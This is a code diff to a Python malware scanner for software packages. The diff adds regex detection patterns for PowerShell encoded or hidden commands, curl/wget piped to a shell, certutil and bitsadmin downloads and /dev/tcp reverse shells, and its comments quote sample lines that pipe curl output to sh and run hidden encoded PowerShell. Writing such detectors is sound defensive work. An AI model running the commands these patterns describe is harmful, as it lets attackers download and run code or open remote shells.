@@ -34,6 +34,26 @@ SOURCE_PATTERNS = [
     (r'b64decode\s*\(', 'decoded_data'),
 ]
 
+# 硬编码高危载荷特征（2026-11）
+# 用于识别"常量载荷直接执行"——这类恶意包没有外部输入源，
+# source→sink 链永远不成立，必须把载荷本身视为 source。
+# 只收录**良性软件几乎不可能出现**的特征，避免误报：
+#   - PowerShell EncodedCommand（Windows 恶意软件投递标配）
+#   - 下载管道执行（curl|sh / wget|bash）
+#   - certutil/bitsadmin 下载（LOLBins）
+#   - 隐藏窗口 + 命令执行
+HARDCODED_PAYLOAD_PATTERNS = [
+    (r'-EncodedCommand', 'powershell_encoded'),
+    (r'-e(nc|ncoded)?\s+[A-Za-z0-9+/]{40,}={0,2}', 'powershell_encoded'),
+    (r'powershell[^\n]*-(w|WindowStyle)\s+[Hh]idden', 'powershell_hidden'),
+    (r'powershell[^\n]*(downloadstring|invoke-webrequest|invoke-expression|iex)', 'powershell_download'),
+    (r'(curl|wget)\s+[^\n|]*\|\s*(sh|bash)\b', 'download_pipe_shell'),
+    (r'certutil[^\n]*-urlcache', 'lolbin_download'),
+    (r'bitsadmin[^\n]*/transfer', 'lolbin_download'),
+    (r'/dev/tcp/\d+\.\d+\.\d+\.\d+', 'reverse_shell'),
+    (r'socket\.socket\([^)]*\)[^\n]*connect\(', 'reverse_shell'),
+]
+
 # 危险汇聚点
 SINK_PATTERNS = [
     (r'(?<![\w.])exec\s*\(', 'code_execution'),
@@ -66,7 +86,8 @@ SOURCE_PRIORITY = {cat: rank for rank, cat in enumerate([
 # 升级原则：只有"良性软件中罕见"的链形态才允许机器自动升级——
 # environment/file_read→exec 是构建工具的日常形态，不参与自动升级
 # （仍可由包级 LLM 聚合基于完整上下文升级）。
-STRONG_SOURCES = {'network_response', 'socket_recv', 'deserialization', 'decoded_data'}
+STRONG_SOURCES = {'network_response', 'socket_recv', 'deserialization',
+                  'decoded_data', 'hardcoded_payload'}
 EXFIL_SINKS = {'data_exfiltration'}
 
 
@@ -178,6 +199,52 @@ def analyze(nodes: List[Dict], edges: List[Dict]) -> List[Dict]:
             if cat:
                 return cat
         return _match(SOURCE_PATTERNS, node.get('code', '') or '')
+
+    # ===== 硬编码载荷：把常量 payload 当作 source（2026-11）=====
+    # 污点模型要求 source→sink，但真实恶意包普遍是**常量载荷直接执行**：
+    #   subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand <b64>')
+    #   os.system('curl http://x/y | sh')
+    # 没有外部输入源，链永远不成立——EsqueleSquad 家族三个包
+    # （tppinghttpget/ramtool/libedgui）因此只落到 SUSPICIOUS。
+    # 处理：sink 节点若携带高危常量特征，生成一条 [hardcoded_payload]→sink 链。
+    # 只匹配强特征（PowerShell EncodedCommand / 下载管道执行 / certutil 等），
+    # 普通 base64 字面量不触发，避免误报。
+    for sink_node, sink_cat in sinks:
+        code = sink_node.get('code', '') or ''
+        payload_kind = _match(HARDCODED_PAYLOAD_PATTERNS, code)
+        if not payload_kind:
+            continue
+        sink_id = sink_node.get('node_id')
+        if not sink_id:
+            continue
+        chain_key = (sink_id, 'hardcoded_payload')
+        if chain_key in seen_chains:
+            continue
+        seen_chains.add(chain_key)
+        chains.append({
+            'sink': {'node_id': sink_id,
+                     'code': code[:160],
+                     'file': sink_node.get('file', ''),
+                     'line': sink_node.get('line', 0)},
+            'sink_category': sink_cat,
+            'source': {'node_id': sink_id,
+                       'code': f'<hardcoded {payload_kind} payload>',
+                       'file': sink_node.get('file', ''),
+                       'line': sink_node.get('line', 0)},
+            'source_category': 'hardcoded_payload',
+            'steps': [
+                {'stage': 'source', 'node_id': sink_id,
+                 'code': f'<hardcoded {payload_kind} payload>',
+                 'file': sink_node.get('file', ''), 'line': sink_node.get('line', 0),
+                 'via': None},
+                {'stage': 'sink', 'node_id': sink_id, 'code': code[:160],
+                 'file': sink_node.get('file', ''), 'line': sink_node.get('line', 0),
+                 'via': 'embedded'},
+            ],
+            'cross_file': False,
+            'confidence': 0.9,
+            'payload_kind': payload_kind,
+        })
 
     for sink_node, sink_cat in sinks:
         if len(chains) >= _MAX_CHAINS:
